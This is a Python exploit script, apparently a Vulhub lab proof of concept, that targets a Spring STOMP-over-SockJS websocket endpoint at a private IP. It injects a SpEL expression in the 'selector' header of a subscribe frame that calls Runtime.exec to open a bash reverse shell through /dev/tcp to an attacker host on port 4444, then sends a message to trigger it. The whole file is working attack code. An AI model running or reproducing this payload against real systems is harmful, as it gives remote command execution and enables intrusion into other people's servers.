import requests
import random
import string
import time
import logging
import sys
import json
import threading

logging.basicConfig(stream=sys.stdout, level=logging.INFO)

def random_str(length):
    letters = string.ascii_lowercase + string.digits
    return ''.join(random.choice(letters) for c in range(length))

def send(url, command, headers, body=''):
    base = f'{url}/{random.randint(0, 1000)}/{random_str(8)}'
    headers.update({
        'Referer': url,
        'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)'
    })
    t = int(time.time()*1000)

    data = [command.upper(), '\n']
    data.append('\n'.join([f'{k}:{v}' for k, v in headers.items()]))
    data.append('\n\n')
    data.append(body)
    data.append('\x00')
    data = json.dumps([''.join(data)])

    response = requests.post(f'{base}/xhr_send?t={t}', headers=headers, data=data)
    if response.status_code != 204:
        logging.info(f"send '{command}' data error.")
    else:
        logging.info(f"send '{command}' data success.")

def listen(url):
    base = f'{url}/{random.randint(0, 1000)}/{random_str(8)}'
    headers = {
        'Referer': url,
        'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)'
    }
    t = int(time.time()*1000)

    while True:
        response = requests.get(f'{base}/htmlfile?c=_jp.vulhub', headers=headers, stream=True)
        for line in response.iter_lines():
            time.sleep(0.5)

url = 'http://192.168.121.129:8080/gs-guide-websocket'
threading.Thread(target=listen, args=(url,)).start()
time.sleep(1)

send(url, 'connect', {
    'accept-version': '1.1,1.0',
    'heart-beat': '10000,10000'
})

send(url, 'subscribe', {
    'selector': 'T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/192.168.121.148/4444;cat <&5 | while read line; do $line 2>&5 >&5; done"})',
    'id': 'sub-0',
    'destination': '/topic/greetings'
})

data = json.dumps({'name': 'vulhub'})
send(url, 'send', {
    'content-length': len(data),
    'destination': '/app/hello'
}, data)
